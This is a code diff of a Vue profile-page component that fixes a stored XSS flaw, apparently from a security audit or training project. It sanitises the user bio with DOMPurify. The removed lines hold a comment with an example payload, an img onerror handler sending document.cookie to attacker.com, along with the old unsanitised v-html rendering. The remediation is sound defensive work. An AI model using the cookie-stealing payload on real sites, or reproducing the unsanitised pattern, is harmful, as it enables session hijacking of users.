@@ -1,11 +1,14 @@
 <script setup>
-import { ref, onMounted } from 'vue'
+import { ref, computed, onMounted } from 'vue'
 import { useRoute } from 'vue-router'
+import DOMPurify from 'dompurify'
 import api from '@/services/api'
 
 const route = useRoute()
 const user = ref({})
 const projects = ref([])
+
+const sanitizedBio = computed(() => DOMPurify.sanitize(user.value.bio || ''))
 
 onMounted(async () => {
   const userId = route.params.id
@@ -30,9 +33,8 @@ onMounted(async () => {
           </div>
         </div>
 
-        <!-- 🔴 A03-02 : XSS STOCKÉ — bio chargée depuis la BDD et injectée sans sanitisation -->
-        <!-- Payload : <img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)"> -->
-        <div class="bio" v-html="user.bio"></div>
+        <!-- A03-02 : bio sanitisée avec DOMPurify avant injection dans le DOM -->
+        <div class="bio" v-html="sanitizedBio"></div>
       </div>
     </div>
 
